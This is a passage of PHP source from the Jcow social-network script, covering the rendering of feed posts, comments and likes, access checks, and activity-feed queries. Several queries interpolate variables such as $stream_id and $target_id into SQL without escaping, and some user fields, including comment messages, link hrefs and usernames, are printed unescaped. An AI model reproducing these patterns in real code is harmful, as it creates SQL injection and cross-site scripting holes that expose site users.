					if ($_SESSION['mobile_style']) {
						$row['message'] = '
						<iframe src="//player.vimeo.com/video/'.$story['var1'].'?title=0&amp;byline=0&amp;portrait=0&amp;color=ffffff" width="330" height="220" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>'.'<br />'.url('videos/viewstory/'.$story['id'],h($story['title']));
					}
					else {
						$row['message'] = '
						<iframe src="//player.vimeo.com/video/'.$story['var1'].'?title=0&amp;byline=0&amp;portrait=0&amp;color=ffffff" width="500" height="350" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>'.'<br />'.url('videos/viewstory/'.$story['id'],h($story['title']));
					}
				}
			}
			if (strlen($story['tags']) && module_actived('topics')) {
				$row['message'] .= story::show_tags($story);
			}
			if (allow_access(3) || $client['id'] == $story['uid']) {
				$app_link = '<li>'.url($row['app'].'/editstory/'.$story['id'],t('Edit')).'</li><li>'
				.url($row['app'].'/deletestory/'.$story['id'],t('Delete')).'</li>';
			}
		}
		elseif ($row['app'] == 'links' && $type=='preview') {
			if ($row['aid']>0) {
				$res = sql_query("select * from ".tb()."stories where id='{$row['aid']}'");
				$story = sql_fetch_array($res);
			}
			else {
				$res = sql_query("select * from ".tb()."stories where stream_id='{$row['id']}'");
				$story = sql_fetch_array($res);
				if ($story['id']) {
					sql_query("update ".tb()."streams set aid='{$story['id']}' where id='{$row['id']}'");
				}
			}
			if (!$story['id']) return '';
			$row['message'] = '<div>
				<div class="story_header">'.url('links/viewstory/'.$story['id'],h($story['title'])).'</div>
				<div style="width:300px;white-space:nowrap;overflow:hidden !important;text-overflow: ellipsis;"><a href="'.$row['var4'].'" target="_blank" rel="nofollow" style="color:#006621">'.$story['var4'].'</a>
				</div>
				</div>
				<div class="story_description">'.strip_tags(utf8_substr($story['content'],250,0)).'</div>
				'.story_like_form($story['stream_id'],array('comment_link'=>1),$story);
		}
		elseif ($row['app'] == 'comments' && $type=='preview') {
			$res = sql_query("select * from ".tb()."comments where id='{$row['aid']}'");
			$comment = sql_fetch_array($res);
			if (!$comment['id']) return '';
			$row['message'] = '<div>
			'.strip_tags(utf8_substr($comment['message'],150,0)).'</div>'.$row['message'];
		}
		elseif (count($row['attachment']) > 1) {
			if (!preg_match('/'.$_SERVER['HTTP_HOST'].'/',$attachment['og_url'])) $og_target='target="_blank"';
			$attachment = $row['attachment'];
			if (strlen($attachment['og_title'])) {
				$att = '<a href="'.url($attachment['og_url']).'" '.$og_target.' class="jcow_og_box" rel="nofollow">';
				if (strlen($attachment['og_img'])) {
					$att .= '<div class="jcow_og_img"><img src="'.$attachment['og_img'].'" /></div>';
				}
				$att .= '<div class="jcow_og_title">'.h($attachment['og_title']).'</div>';
				if (strlen($attachment['og_des'])) {
					$att .= '<div class="jcow_og_des">'.h(utf8_substr($attachment['og_des'],150)).'</div>';
				}
				$parse = parse_url($attachment['og_url']);
				$att .= '<div class="jcow_og_host">'.strtoupper($parse['host']).'</div></a>';
			}
			else {
				if ($attachment['cwall_id'] == 'none') {
					$no_comment = 1;
				}
				$att = '<div class="att_box">';
				if (strlen($attachment['name'])) {
					if (strlen($attachment['uri'])) {
						$att .= '<div class="att_name"><a href="'.url($attachment['uri']).'" rel="nofollow">'.h($attachment['name']).'</a></div>';
					}
					else {
						$att .= '<div class="att_name">'.h($attachment['name']).'</div>';
					}
				}
				if (strlen($attachment['title'])) {
					$att .= '<div class="att_title"><a href="'.url($attachment['uri']).'" rel="nofollow">'.h($attachment['title']).'</a></div>';
				}
				if (is_array($attachment['thumb']) && $type != 'simple' && $type != 'mobile') {
					foreach ($attachment['thumb'] as $thumb) {
						if ($thumb) {
							$thumbs .= url($attachment['uri'],'<img src="'.uhome().'/'.$thumb.'" style="width:180px;height:auto" />');
						}
					}
				}
				if (strlen($attachment['des']) || strlen($thumbs)) {
					$att .= '<div class="att_des">'.$thumbs.h($attachment['des']).'</div>';
				}
				$att .= '</div>';
			}
		}
		
	}
	if ($row['app']) {
		$row['cwall_id'] = $row['app'].$row['aid'];
		$icon = '/modules/'.$row['app'].'/icon';
		if ($row['app'] == 'pcomment') {
			$icon = '/files/appicons/pcomment';
		}
	}
	else {
		$row['cwall_id'] = $row['id'];
		$icon = '/files/appicons/status';
		//$row['message'] = $row['message'].' '.url($mu.'u/'.$row['username'].'/status/'.$row['id'], t('View status'));
		$res = sql_query("select * from ".tb()."status_photos where sid='{$row['id']}'");
		$status_photo = sql_fetch_array($res);
		if ($status_photo['id']) {
			if ($type == 'simple') {
				$row['message'] .= '<br /><img src="'.$status_photo['thumb'].'" />';
				}
			else {
				$row['message'] .= '<br /><img src="'.$status_photo['uri'].'" class="status_photo"  />';
			}
		}
	}
	$avatar_size = 50;
	$avatar_box_size = 60;
	if (!in_array($row['app'],array('questions','discussions')) && $parr[0] != 'ads') {
		if (!$row['stuff_id']) {
			if ($client['id'] && $type != 'simple' && $type != 'mobile' && !$hide_form && !$no_comment) {
				$comment_form = comment_form($row['id'],'','',array('boosted'=>$args['is_boost']));
				$story_opt = story_opt($row['id'],'','',array('boosted'=>$args['is_boost']));
			}
			else {
				$comment_form = comment_form($row['id'],'none','',array('boosted'=>$args['is_boost']));
				$story_opt = story_opt($row['id'],'','',array('boosted'=>$args['is_boost']));
			}
		}
		else {
			$comment_form = reply_form($row['id'],$row['username']);
		}

		if ($type == 'simple' && !$no_comment) {
			$comment_get = '';
		}
		else {
			$comment_get = comment_get($row['id'],$comment_num);
		}
		if (!$row['stuff_id']) {
			$comment_get = likes_get($row).$comment_get;
		}
	}
	$icon = '<img src="'.uhome().$icon.'.png" />';
	if ($row['app'] == 'photo') {
		$icon = '';
	}
	if ($page['type'] != 'page' && $row['wall_id'] != $row['uid'] && $row['wall_id'] != $target_id) {
		if ($row['wall_uid'] != $row['uid']) {
			if ($page['type'] == 'u') {
				$hdh = url($mu.'u/'.$page['uri'],t("{1}'s wall",'<strong>'.h($page['uri']).'</strong>'));
			}
			elseif ($page['type'] == 'group') {
				$hdh = url('group/'.$page['uri'],'<strong>'.h($page['name']).'</strong>');
			}
			else {
				$hdh = url('page/'.$page['uri'],'<strong>'.h($page['name']).'</strong>');
			}
		}
	}
	if ($page['type'] == 'page') {
		if ($page['logo']) 
			$page['logo'] = uploads.'/avatars/s_'.$page['logo'];
		$display_logo = gallery_box(array('img'=>$page['logo'],'link'=>url('page/'.$page['uri']),'name'=>h($page['name']),'hide_name'=>1));
		$display_name = '<a href="'.url('page/'.$page['uri']).'" class="link">'.h($page['name']).'</a>';
		//$report_link = url('report',t('report'),'',array('pid'=>$page['id']));
		$report_link = '<li><a href="'.url('report/ajax','','',array('url'=>url('feed/view/'.$row['id']))).'" class="jcow_btn">'.t('Report').'</a></li>';
	}
	else {
		$display_logo = gallery_box(array('img'=>$row['avatar'],'link'=>url('u/'.$row['username']),'name'=>h($row['fullname']),'hide_name'=>1));
		$display_name = '<a href="'.url($mu.'u/'.$row['username']).'" class="link" rel="nofollow">'.h($row['fullname']).' <span class="sub">@'.$row['username'].'</span></a>';
		$report_link = '<li><a href="'.url('report/ajax','','',array('url'=>url('feed/view/'.$row['id']))).'" class="jcow_btn">'.t('Report').'</a></li>';
	}
	if (!$client['id']) {
		$report_link = '<li>'.url('member/login',t('Report')).'</li>';
	}

	if (allow_access(3)) {
		/*
		if ($row['type'] == 0 && !$row['stuff_id'] && $page['type'] != 'group') {
			$feature_link = '<li><a href="#" class="stream_hot_btn" sid="'.$row['id'].'"><i class="fa fa-fire"></i> Make it hot</a></li>';
		}
		elseif ($row['type'] == 2) {
			$feature_link = '<li><a href="#" class="stream_hot_btn" sid="'.$row['id'].'"><i class="fa fa-fire"></i> Undo Make hot</a></li>';
		}
		*/
		$deleteuser_link = '<li><a href="#" class="deleteuser" uid="'.$row['uid'].'">Delete user</a></li>';
	}
	if (!strlen($row['app']) && ($row['uid'] == $client['id'] || allow_access(3))) {
		$delete_link = '<li><a href="#" class="stream_delete" sid="'.$row['id'].'">'.t('Delete stream').'</a></li>';
	}
	if ($_SESSION['mobile_style']) {
		$delete_link = '';
	}
	if ($page['type'] == 'group' && $target_id != $page['id']) {
		$page_info = ' <span class="jcow_stream_page_info"><i class="fa fa-users"></i> '.url('group/'.$page['uri'],h($page['name'])).'</span>';
	}
	if ($page['type'] == 'u' && $client['id'] && $client['id'] != $page['uid']) {
		/*
		$res = sql_query("select * from jcow_followers where uid='{$client['id']}' and fid='{$page['uid']}'");
		if (!sql_counts($res)) {
			$follow_btn = '<span><a class="btn btn-default btn-xs dofollow" href="#" page_id="'.$page['id'].'"><i class="fa fa-plus"></i> '.t('Follow').'</a></span>';
		}
		*/
	}
	if ($page['type'] == 'page' && $client['id'] && $client['id'] != $page['uid']) {
		$res = sql_query("select * from jcow_page_users where pid='{$page['id']}' and uid='{$client['id']}'");
		if (!sql_counts($res)) {
			$follow_btn = '<span><a class="btn btn-default btn-xs dofollow" href="#" page_id="'.$page['id'].'"><i class="fa fa-plus"></i> '.t('Like').'</a></span>';
		}
	}
	$hot_num = get_gvar('jcow_hot_likes');
	if (!is_numeric($hot_num) || $hot_num<1) {
		$hot_num = 2;
	}
	if ($row['type']==1) {
		$private = ' <i class="fa fa-user-secret"></i>';
	}
	if ($args['is_boost']) {
		$boosted = '<span class="boosted"><i class="fa fa-bolt"></i> '.t('Boosted').'</span>';
	}
	$data = @unserialize($row['data']);
	if (is_array($data)) {
		if (strlen($data['checkin_name'])) {
			$checkin = '<div class="checkin_info"><i class="fa fa-map-marker"></i> '.h($data['checkin_name']).'</div>';
		}
	}
	if (!is_mobile()) {
		$drop_down = '<div class="dropdown">
						<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" ><i class="fa fa-2x fa-angle-down"></i></a>
						<ul class="dropdown-menu dropdown-menu-right">
						'.$app_link.$report_link.$delete_link.'
						</ul>
					</div>';
				}
	else {
		$drop_down = '<div class="dropdown">
						<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" ><i class="fa fa-2x fa-angle-down"></i></a>
						<ul class="dropdown-menu dropdown-menu-right">
						'.$report_link.$delete_link.'
						</ul>
					</div>';
	}
	if ($args['share_preview']) {
		$story_opt = $comment_get = $comment_form = '';
	}
	return '<div class="user_post_1 userbox_'.$row['uid'].'">
		<div class="user_post_content">
			<div class="user_post_h">
				<div class="user_post_h_l">
					<div style="float:left;width:60px;height:60px">'.$display_logo.'</div>
					<div style="display:inline-block;max-width:150px;overflow:hidden;text-overflow: ellipsis;white-space: nowrap;vertical-align:middle">'.$display_name.'</div> '.$follow_btn.'
					<div class="user_post_h_s"><span class="sub">'.get_date($row['created']).$private.$hot_stream.'</span>'.$page_info.'</div>
				</div>
				<div class="user_post_h_r">
				'.$boosted.'
					'.$drop_down.'
				</div>
			</div>
			 '.$row['message'].
				$att.$checkin.'
			'.$story_opt.$comment_get.$comment_form.
		'</div>
	</div>
		';
}

/* comment */


function comment_publish($stream_id, $message) {
	global $client;
	$comment['stuff_id'] = $stream_id;
	$comment['uid'] = $client['id'];
	$comment['message'] = $message;
	$comment['created'] = time();
	$res = sql_query("select s.*,p.type as page_type from ".tb()."streams as s left join ".tb()."pages as p on p.id=s.wall_id where s.id='$stream_id'");
	$stream = sql_fetch_array($res);
	if ($stream['uid']) {
		if ($stream['stuff_id']) {
			$comment['stuff_id'] = $stream['stuff_id'];
		}
		$comment['wall_id'] = $stream['wall_id'];
		$return = parse_mentions($comment['message']);
		$comment['message'] = $return['message'];
		$comment['type'] = $stream['type'];
		sql_insert($comment,tb()."streams");
		$cid = insert_id();
		add_mentions($return['mentions'],$cid,$comment['wall_id']);
		sql_query("update ".tb()."accounts set forum_posts=forum_posts+1 where id='{$client['id']}'");
		return $cid;
	}
	else {
		return 0;
	}
}

function likes_get($stream = '',$cwall_id='',$message='') {
	if (is_numeric($stream)) {
		$res = sql_query("select id,likes,dislikes from ".tb()."streams where id='{$stream}'");
		$stream = sql_fetch_array($res);
	}
	if (!$stream['id']) {
		return '';
	}
	$return = '';
	if ($stream['likes']) {
		$return = '<div class="user_comment">
		<i class="fa fa-thumbs-o-up"></i> <a href="#" onclick="jQuery.facebox({ ajax: \''.url('jquery/wholike/'.$stream['id']).'\' });return false;" >'.
			t('{1} people like this','<strong>'.$stream['likes'].'</strong>').
			'</a>
		</div>';
	}
	if ($stream['dislikes']) {
		$return .= '<div class="user_comment">
		<i class="fa fa-thumbs-o-down"></i> <a href="#" onclick="jQuery.facebox({ ajax: \''.url('jquery/whodislike/'.$stream['id']).'\' });return false;" >
		'.
			t('{1} people dislike this','<strong>'.$stream['dislikes'].'</strong>').
			'</a>
		</div>';
	}
	return $return;
}
function comment_get($target_id,$num = 12,$hide_button=0) {
	if ($target_id > 0) {
		$more = $num+1;
		$res = sql_query("select c.*,u.username,u.fullname,u.avatar,u.disabled,p.logo as page_logo,p.type as page_type,p.uri as page_uri,p.name as page_name,p.uid as page_uid from ".tb()."streams as c left join ".tb()."accounts as u on u.id=c.uid left join ".tb()."pages as p on p.id=c.wall_id where c.stuff_id='{$target_id}' order by id desc limit $more");
		$i=1;
		while($row = sql_fetch_array($res)) {
			if ($i <=$num) {
				$comments = comment_display($row).$comments;
			}
			$i++;
		}
		if ($i>$num && !$hide_button) {
			$more_link = '<div class="user_comment">&nbsp;&nbsp;'.url('feed/view/'.$target_id,t('All comments')).'</div>';
		}
		return $comments.$more_link;
	}
}

function comment_display($row = array()) {
	global $client;
	if (!is_array($row) || !$row['id']) {
		return '';
		}
	if (!strlen($row['username'])) {
		$res = sql_query("select c.*,u.username,u.fullname,u.avatar,u.disabled,p.logo as page_logo,p.type as page_type,p.uri as page_uri,p.name as page_name,p.uid as page_uid from ".tb()."streams as c left join ".tb()."accounts as u on u.id=c.uid left join ".tb()."pages as p on p.id=c.wall_id where c.id='{$row['id']}'");
		$row = sql_fetch_array($res);
	}
	if ($row['disabled'] == 3)
		return '';
	if ($row['wall_id'] && $row['page_type'] == 'page' && $row['page_uid'] == $row['uid']) {
		$report_link = url('report',t('report'),'',array('pid'=>$row['wall_id']));
		if (!$row['page_logo']) {
			$avatar = gallery_box(array('img'=>'','link'=>url('page/'.$row['page_uri']),'name'=>h($row['page_name']),'hide_name'=>1,'sm'=>1));
		}
		else {
			$avatar = '<a href="'.url('page/'.$row['page_uri']).'">
			<img width="25" height="25" src="'.uhome().'/'.uploads.'/avatars/s_'.$row['page_logo'].'" /></a>';
		}
		$uname = url('page/'.$row['page_uri'],h($row['page_name']));
		$tag_user = '';
	}
	else {
		$report_link = url('report',t('report'),'',array('url'=>url('feed/view/'.$row['id'])));

		$tag_user = $row['username'];
		$uname = url('u/'.$row['username'], h($row['fullname']));
		if (!strlen($row['avatar'])) {
			$avatar = gallery_box(array('img'=>'','link'=>url('u/'.$row['username']),'name'=>h($row['fullname']),'hide_name'=>1,'sm'=>1));
		}
		else {
			$avatar = avatar($row,25);
		}
	}
	if ($client['id'] && $row['username'] != $client['username']) {
		$quick_reply = '<a href="#" uname="'.$tag_user.'" class="quick_reply">+'.t('Reply').'</a>';
	}
	preg_match_all("/emoji([\d]+)/",$row['message'],$o);
	$o = array_slice($o[1], 0, 7);
	if (count($o)) {
		foreach ($o as $k) {
			$ename = 'emoji'.$k;
			$fname = 'files/emoji/'.$k.'.gif';
			if (file_exists($fname)) {
				$row['message'] = str_replace($ename,'<img src="'.$fname.'" />',$row['message']);
			}
		}
	}
	return '
		<div class="user_comment">
			<table width="100%">
			<tr>
			<td class="user_post_left" width="30" valign="top">'.$avatar.'</td>
			<td class="user_post_right" valign="top">
			<span class="comment_uname">'.$uname.'</span>:
			 '.$row['message'].' '.$quick_reply.'
			<div class="att_bottom">'.get_date($row['created']).' '.$row['pending_review'].' '.
				$report_link.'
			</div></td>
			</tr>
			</table>
		</div>
			';
}



function showad() {
	if (valid_license('p'))
		return false;
	else
		return true;
}

/* ################################ profile comment */


function profile_comment_publish($target_id, $message) {
	global $client;
	$comment['target_id'] = $target_id;
	$comment['uid'] = $client['id'];
	$comment['message'] = $message;
	$comment['created'] = time();
	sql_insert($comment,tb()."profile_comments");
	return insert_id();
}

function profile_comment_get($target_id,$num = 12, $offset = 0) {
	$res = sql_query("select c.*,u.username,u.avatar from ".tb()."profile_comments as c left join ".tb()."accounts as u on u.id=c.uid where c.target_id='{$target_id}' ".dbhold('c')." order by id desc limit $offset,$num");
	while($row = sql_fetch_array($res)) {
		$comments .= profile_comment_display($row);
	}
	return $comments;
}

function profile_comment_display($row = array(), $hide_form = 0) {
	global $client;
	if (!$row['avatar']) {
		$res = sql_query("select avatar from ".tb()."accounts where id='{$row['uid']}'");
		$row2 = sql_fetch_array($res);
		if (!$row2['avatar'])
			$row['avatar'] = 'undefined.jpg';
		else
			$row['avatar'] = $row2['avatar'];
	};
	$row['cwall_id'] = 'comment'.$row['id'];
	if ($client['id'] && !$client['no_comment'] && !$hide_form && $row['stream_id']) {
		$comment_form = comment_form($row['stream_id'],t('Reply'));
	}
	return '
		<div class="user_post_1">
			<table width="100%">
			<tr>
			<td class="user_post_left" width="60" valign="top">'.avatar($row).'</td>
			<td class="user_post_right" valign="top">
			<strong>'.url('u/'.$row['username'], $row['username']).'</strong>
			 '.decode_bb(h($row['message'])).
				 $comment_form.comment_get($row['cwall_id'],3).'
			<div class="att_bottom">'.get_date($row['created']).'</div></td>
			</tr>
			</table>
		</div>
			';
}

function privacy_access($ptype, $owner = 0) {
	global $client;
	if (!$ptype) {
		return true;
	}
	elseif (!$client['id']) {
		return false;
	}
	if (!$owner) {
		return false;
	}
	if ($owner == $client['id']) {
		return true;
	}
	if ($ptype > 0) {
		$res = sql_query("select * from ".tb()."friends where uid='{$client['id']}' and fid='{$owner}' limit 1");
		if (sql_counts($res)) {
			return true;
		}
		else {
			return false;
		}
	}
}

function jcow_privacy_form($preset=0) {
	if (jedition == 'CE') {
		return '';
	}
	if ($preset>0) {
		$selected1 = 'selected';
	}
	else {
		$selected0 = 'selected';
	}
	return '<input type="hidden" name="privacy" id="privacy_input" value="0" />
	<a href="#" id="privacy_selector_public" class="btn btn-default btn-sm"><i class="fa fa-globe"></i> '.t('Public').' <i class="fa fa-toggle-off"></i></a> <a href="#" id="privacy_selector_friends" class="btn btn-default btn-sm" style="display:none"><i class="fa fa-user-secret"></i> '.t('Friends only').' <i class="fa fa-toggle-on"></i></a>
	';
	/*
	return '
	<select name="privacy" style="font-size:11px">
	<option value="0" '.$selected0.'>'.t('Everyone').'</option>
	<option value="1" '.$selected1.'>'.t('Friends only').'</option>
	</select>';
	*/
}

function privacy_form($row = array()) {
	return '';
}




function allow_access($roleids, $force_uid = 0) {
	if (is_array($GLOBALS['client']['roles']) && in_array('3',$GLOBALS['client']['roles']))
		return true;
	if ($force_uid) {
		if (!$GLOBALS['client']['id'] or $force_uid != $GLOBALS['client']['id'])
			return false;
	}
	if (is_array($roleids)) {
		foreach ($roleids as $roleid) {
			if (in_array($roleid,$GLOBALS['client']['roles']))
				return true;
		}
	}
	else {
		if (is_array($GLOBALS['client']['roles']) && in_array($roleids, $GLOBALS['client']['roles']))
			return true;
	}
	return false;
}

if ($parr[0] == 'poweredby') {
	c('Powered by <a href="http://www.jcow.net">Jcow '.jversion().'</a>');
	stop_here();
}

function feed_activity_get($uid,$num = 12,$offset=0,$target_id=0,$pager=0,$type='',$attr = array()) {
	global $client, $adbanner_displayed,$config;
	if ($attr['direct_output']) {
		global $sections;
		$sections = array();
	}
	$extra = $num+1;
	$i = 1;
	if ($offset > 240 || $num > 50) return ''; // to avoid from high server load;
	if (!is_numeric($offset) || !is_numeric($target_id) || !is_numeric($uid)) die('wrong act p');
	if ($type == 'mentions') {
		if (is_numeric($attr['uid']) && $attr['uid']>0) {
			$res = sql_query("select s.*,u.username,u.avatar,p.uid as wall_uid from ".tb()."mentions as m left join ".tb()."streams as s on s.id=m.stream_id left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id where m.uid='{$attr['uid']}' and s.hide!=1 order by m.id desc limit $offset,$extra");
		}
		else {
			$res = sql_query("select s.*,u.username,u.avatar,p.uid as wall_uid from ".tb()."mentions as m left join ".tb()."streams as s on s.id=m.stream_id left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id where m.uid='$uid' and s.hide!=1 order by m.id desc limit $offset,$extra");
		}
	}
	elseif($type == 'likes') {// likes
		$res = sql_query("select s.*,u.username,u.fullname,u.avatar,p.uid as wall_uid from ".tb()."liked as l left join ".tb()."streams as s on s.id=l.stream_id left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id where l.uid='{$uid}' and s.hide!=1 order by l.id desc limit $offset,$extra");
	}
	elseif($type == 'hot') {
		$hot_num = get_gvar('jcow_hot_likes');
		$res = sql_query("select s.*,u.username,u.fullname,u.avatar,p.uid as wall_uid from  ".tb()."streams as s
			left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id where s.id>
						(
						select IFNULL(
						(select id from jcow_streams  order by id desc limit 1000,1)
						,0)
						)
			and !s.stuff_id and (s.type=0 && p.type!='group') and 
			!s.hide order by (s.likes+s.created/(3600*36)) desc limit $offset,$extra");
	}
	elseif($type == 'latest') {
		$hot_num = get_gvar('jcow_hot_likes');
		$res = sql_query("select s.*,u.username,u.fullname,u.avatar,p.uid as wall_uid, IFNULL(cmt.created,s.created) as cmt_created from  ".tb()."streams as s
			left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id 

			left join jcow_streams as cmt on cmt.id=
				(select id from jcow_streams where stuff_id=s.id order by id desc limit 1)

			where s.id>
						(
						select IFNULL(
						(select id from jcow_streams  order by id desc limit 500,1)
						,0)
						)
			and !s.stuff_id and (s.type=0 && p.type!='group') and 
			!s.hide order by cmt_created desc limit $offset,$extra");
	}
	elseif($type == 'topics') {
		if (!is_array($attr['tids'])) return ' ';
		foreach($attr['tids'] as $tid) {
			if (is_numeric($tid)) {
				$tids[] = $tid;
			}
		}
		if (!is_array($tids) || count($tids)<=0) return 'b';

		$res = sql_query("select s.*,u.username,u.avatar,p.uid as wall_uid from ".tb()."topic_ids as ti left join ".tb()."stories as st on st.id=ti.sid left join ".tb()."streams as s on s.id=st.stream_id
			left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id
			 where ti.tid in (".implode(',',$tids).") order by st.id desc limit $offset,$extra");
	}
	elseif ($type == 'featured') {
		$page_p_ids = array_filter(explode(',',get_text('suggest_p')));
		if (count($page_p_ids)>0) {
			$page_ids = implode(',',$page_p_ids);
		}
		else {
			c(t('You need to login to see posts'));
			stop_here();
		}
		$res = sql_query("select s.*,u.username,u.fullname,u.avatar,p.uid as wall_uid from ".tb()."streams as s left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id where 
			s.wall_id in({$page_ids})
			and s.stuff_id=0  and 
			(((p.type='u' || p.type='page') and s.uid=p.uid) or p.type='group') and s.type=0 and s.hide!=1 order by s.id desc limit $offset,$extra");
	}
	elseif($type == 'following') {
		/* 
		if (module_actived('topics')) {
			$tids = array();
			$res = sql_query("select tid from ".tb()."topics_followed where uid='{$client['id']}' limit 100");
			while ($row = sql_fetch_array($res)) {
				$tids[] = $row['tid'];
			}
			if (count($tids)) {
				$tsids = array();
				$res = sql_query("select s.stream_id from ".tb()."topic_ids as t left join ".tb()."stories as s on s.id=t.sid where t.tid in (".implode(',',$tids).") order by s.id desc limit 100");
				while ($row = sql_fetch_array($res)) {
					if (is_numeric($row['stream_id']) && $row['stream_id'] > 0) {
						$tsids[] = $row['stream_id'];
					}
				}
				if (count($tsids)) {
					$topic_sts = " or s.id in (".implode(',',$tsids).") ";
				}
			}
		}
		*/
		$page_ids = $friendsids = array();
		$page_ids[] = $client['page']['id'];
		$friendsids[] = $client['id'];
		/*
		$res = sql_query("select f.fid,p.id as pageid from ".tb()."friends as f left join ".tb()."pages as p on p.uid=f.fid where f.uid='{$client['id']}' order by p.updated desc limit 30");
		while ($row = sql_fetch_array($res)) {
			$friendsids[] = $row['fid'];
			if (is_numeric($row['pageid'])) {
				$page_ids[] = $row['pageid'];
			}
		}
		*/
		$res = sql_query("select f.fid,p.id as pageid from ".tb()."friends as f left join ".tb()."pages as p on p.uid=f.fid where f.uid='{$client['id']}' order by p.updated desc limit 20");
		while ($row = sql_fetch_array($res)) {
			$friendsids[] = $row['fid'];
		}
		
		
		$res = sql_query("select f.fid,p.id as pageid,p.description,p.type,p.uid from ".tb()."followers as f left join ".tb()."pages as p on (p.uid=f.fid and p.type='u') where f.uid='{$client['id']}' order by p.updated desc limit 20");
		while ($row = sql_fetch_array($res)) {
			if (is_numeric($row['pageid'])) {
				$page_ids[] = $row['pageid'];
			}
		}
		
		$res = sql_query("select u.pid from ".tb()."page_users as u left join ".tb()."pages as p on p.id=u.pid where u.uid='{$client['id']}'  limit 50");
		while($page = sql_fetch_array($res)) {
			if (is_numeric($page['pid']))
				$page_ids[] = $page['pid'];
		}
		/*
		$res = sql_query("select * from ".tb()."pages where uid='{$client['id']}' and type='page'");
		while ($ffpage = sql_fetch_array($res)) {
			if (!in_array($ffpage['id'],$page_ids)) {
				$page_ids[] = $ffpage['id'];
			}
		}
		*/
		$page_ids = implode(',',$page_ids);
		$friendsids = implode(',',$friendsids);
		$res = sql_query("select s.*,u.username,u.fullname,u.avatar,p.uid as wall_uid from ".tb()."streams as s left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id where 
			s.wall_id in({$page_ids})
			and s.stuff_id=0  and 
			(p.type='group' or 
				(s.uid=p.uid and (p.type='u' || p.type='page') and (!s.type or s.uid in($friendsids) )    )        
			)
			and s.hide!=1 order by s.id desc limit $offset,$extra");
			
		/*
		$res = sql_query("select s.*,u.username,u.fullname,u.avatar,p.uid as wall_uid from ".tb()."streams as s left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id where 
			s.wall_id in({$page_ids})
			and s.stuff_id=0  and 
			(p.type='group' or 
				(s.uid=p.uid and (p.type='u' || p.type='page')   )        
			)
			and s.hide!=1 order by s.id desc limit $offset,$extra");
			*/
		
		
	}
	else {
		return '';
	}

	// boost
	if (module_actived('ads') && get_gvar('ads_enabled')) {
		$res2 = sql_query("select b.* from jcow_ad_boosts as b left join jcow_ad_funds as f on f.uid=b.uid where f.amount>0 and b.type='post' and b.budget>b.spent order by b.bid DESC,b.created ASC limit 1");
		$boost = sql_fetch_array($res2);
		if ($boost['id']) {
			$res2 = sql_query("select s.*,u.username,u.fullname,u.avatar,p.uid as wall_uid from ".tb()."streams as s left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id where 
				s.id='{$boost['target_id']}'");
			$boost_post = sql_fetch_array($res2);
			c(stream_display($boost_post,'preview','',0,3,array('is_boost'=>1)));
			$taken = 0.02;
			if ($boost['bid']>20) $taken = 0.2;
			$trigger = ceil(1000*0.02/$boost['bid']);
			if ($boost['views']%$trigger === 0) {
				$taken_sql = ",spent=spent+$taken ";
				sql_query("update jcow_ad_funds set amount=amount-$taken where uid='{$boost['uid']}'");
			}
			sql_query("update jcow_ad_boosts set views=views+1 $taken_sql where id='{$boost['id']}'");
			section_close();
		}
	}
	
	$i=1;
	while($row = sql_fetch_array($res)) {
		if ($row['id'] == $boost['target_id']) continue;
		if ($i <= $num) {
			$row['attachment'] = unserialize($row['attachment']);
			c(stream_display($row,'preview','',$target_id));
			section_close();
		}
		if (!$attr['direct_output'] && $offset == 0 && $i == 1 && !$coafig['hide_ad'] && !$adbanner_displayed && strlen(get_gvar('jcow_inline_banner_ad'))) {
			c(get_gvar('jcow_inline_banner_ad'));
			section_close();
			$adbanner_displayed = 1;
			}
		$i++;
	}
	if ($i < 2) {
		c(' ');
		section_close();
	}
	if ($pager && $i > $num) {
		$uid = str_replace(',','_',$uid);
		if ($offset == 0) {
			c('<div id="morestream_box"></div>
				<div>
				<script>
				$(document).ready(function(){
					$(".block_content").on("click",".morestream_button",function() {
						$(this).hide();
						$("#morestream_box").html("<i class=\"fa fa-spinner fa-lg fa-spin\"></i>");
						$.post("'.uhome().'/index.php?p=feed/feedmoreactivities",
									{offset:$("#stream_offset").val(),type:"'.$type.'",num:'.$num.',target_id:'.$target_id.'},
									  function(data){
										var currentVal = parseInt( $("#stream_offset").val() );
										$("#stream_offset").val(currentVal + '.$num.');
										$("#morestream_box").parent().parent().before(data);
										if (data.length>50) {
											$(".morestream_button").show();
										}
										$("#morestream_box").html("");
										},"html"
									);
						return false;
					});
				});
				</script>
	
				<input type="hidden" id="stream_offset" value="'.$num.'" /><a href="#" class="morestream_button" rel="nofollow"><strong>'.t('See More').'</strong></a>
			</div>');
		}
		else {
		c('
			<a href="#" class="morestream_button"><strong>'.t('See More').'</strong></a>
			');
			}
	}
	if ($attr['direct_output']) {
		section_close();
		if (is_array($sections) and count($sections)) {
			foreach ($sections as $section) {
				$output .= '<div class="block"><div class="block_content">'.$section['content'].'</div></div>';
			}
		}
	}
	return $output;
}
?>